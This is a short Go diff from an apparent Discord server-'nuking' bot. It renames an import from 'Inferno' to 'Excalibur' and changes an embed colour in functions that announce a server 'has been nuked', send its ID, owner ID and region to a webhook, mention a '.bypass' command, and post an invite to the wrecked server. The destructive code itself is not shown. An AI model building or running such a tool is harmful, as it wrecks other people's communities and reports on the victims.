@@ -1,7 +1,7 @@
 package start_end
 
 import (
-	"Inferno/core/requests"
+	"Excalibur/core/requests"
 	"encoding/json"
 	"fmt"
 	"os"
@@ -29,7 +29,7 @@ func Logs(s *discordgo.Session, event *discordgo.GuildCreate) {
 	embed := discordgo.MessageEmbed{
 		Title:     "Server " + fmt.Sprint(event.Name) + " has been nuked.",
 		Thumbnail: &thumbnail,
-		Color:     00255,
+		Color:     1677721,
 		Description: "> **Server ID:** " + "`" + fmt.Sprint(event.ID) + "`\n" +
 			"> **Owner ID:** " + "`" + fmt.Sprint(event.OwnerID) + "`\n" +
 			"> **Region:** " + "`" + fmt.Sprint(event.Region) + "`\n" +
@@ -58,7 +58,7 @@ func LogsAlert(s *discordgo.Session, event *discordgo.GuildCreate) {
 
 	embed := discordgo.MessageEmbed{
 		Title: "Server " + fmt.Sprint(event.Name) + " has been nuked via ``.bypass`` command.",
-		Color: 00255,
+		Color: 1677721,
 	}
 
 	data := &discordgo.WebhookParams{
@@ -86,7 +86,7 @@ func InviteCreate(s *discordgo.Session, event *discordgo.GuildCreate) {
 
 	embed := discordgo.MessageEmbed{
 		Title:       "Invite to nuked server",
-		Color:       00255,
+		Color:       1677721,
 		Description: "> **" + "https://discord.gg/" + fmt.Sprint(invite.Code) + "**\n",
 	}
 
